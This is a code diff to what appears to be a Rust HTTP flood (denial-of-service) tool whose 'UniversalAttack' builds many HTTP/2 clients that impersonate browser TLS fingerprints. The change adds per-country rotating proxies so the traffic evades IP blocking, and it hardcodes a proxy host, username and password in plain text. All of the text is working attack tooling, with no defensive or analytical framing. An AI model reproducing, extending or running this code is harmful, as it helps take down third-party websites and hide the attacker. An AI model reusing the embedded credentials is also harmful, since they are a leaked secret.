@@ -179,6 +179,28 @@ static PROFILES: &[BrowserProfile] = &[
     },
 ];
 
+// ── Proxy config ──────────────────────────────────────────────────────────────
+const PROXY_HOST: &str = "schro.quantumproxies.net";
+const PROXY_PORT: u16  = 1111;
+const PROXY_USER: &str = "Quantum-wayybcf1";
+const PROXY_PASS: &str = "y1tSX1V7h9xjxY4tYPGo";
+
+static COUNTRIES: &[&str] = &[
+    "US","GB","DE","FR","JP","CA","AU","BR","IN","IT",
+    "ES","NL","PL","SE","NO","DK","FI","CH","AT","BE",
+    "PT","RU","UA","KR","SG","HK","TW","MX","AR","CL",
+    "CO","ZA","NG","EG","SA","AE","TR","GR","CZ","RO",
+    "HU","SK","BG","HR","RS","SI","LT","LV","EE","IE",
+    "IL","TH","MY","ID","PH","VN","NZ","PK","BD","NG",
+];
+
+fn proxy_url(country: &str) -> String {
+    format!(
+        "http://{}:{}_country-{}@{}:{}",
+        PROXY_USER, PROXY_PASS, country, PROXY_HOST, PROXY_PORT
+    )
+}
+
 // ── Fast PRNG ────────────────────────────────────────────────────────────────
 #[inline(always)] fn xorshift(s: &mut u64) -> u64 { *s ^= *s<<13; *s ^= *s>>7; *s ^= *s<<17; *s }
 #[inline(always)] fn pick_idx(len: usize, rng: &mut u64) -> usize { xorshift(rng) as usize % len }
@@ -261,16 +283,22 @@ fn build_tls_variants() -> Vec<Arc<ClientConfig>> {
     configs
 }
 
-fn make_client(tls: Arc<ClientConfig>, p: &BrowserProfile, conns: usize) -> Option<Client> {
+fn make_client(tls: Arc<ClientConfig>, p: &BrowserProfile, conns: usize, country: &str) -> Option<Client> {
+    let proxy_str = proxy_url(country);
+    let proxy = match reqwest::Proxy::all(&proxy_str) {
+        Ok(pr) => pr,
+        Err(e) => { tracing::warn!("Proxy build failed ({}): {}", proxy_str, e); return None; }
+    };
     Client::builder()
         .use_preconfigured_tls((*tls).clone())
+        .proxy(proxy)
         .http2_prior_knowledge()
         .http2_initial_stream_window_size(p.h2_window)
         .http2_initial_connection_window_size(p.h2_conn_w)
         .http2_max_frame_size(p.h2_frame)
-        .http2_adaptive_window(false) // fixed window = real browser behavior
+        .http2_adaptive_window(false)
         .tcp_nodelay(true)
-        .timeout(Duration::from_secs(8))
+        .timeout(Duration::from_secs(10))
         .pool_max_idle_per_host(conns)
         .pool_idle_timeout(Duration::from_secs(60))
         .build()
@@ -339,12 +367,14 @@ impl Attack for UniversalAttack {
                     .expect("rt");
 
                 rt.block_on(async move {
-                    // Build one client per profile — each has matched TLS + H2 settings
+                    // Build one client per profile — each gets different country proxy
                     let clients: Vec<(Arc<Client>, usize)> = PROFILES.iter().enumerate()
                         .filter_map(|(pi, prof)| {
                             let tls_idx = prof.tls_idx % tls_variants.len();
                             let tls     = tls_variants[tls_idx].clone();
-                            make_client(tls, prof, conns).map(|c| (Arc::new(c), pi))
+                            // Rotate country: each profile gets a different country
+                            let country = COUNTRIES[(core_id * PROFILES.len() + pi) % COUNTRIES.len()];
+                            make_client(tls, prof, conns, country).map(|c| (Arc::new(c), pi))
                         })
                         .collect();
 
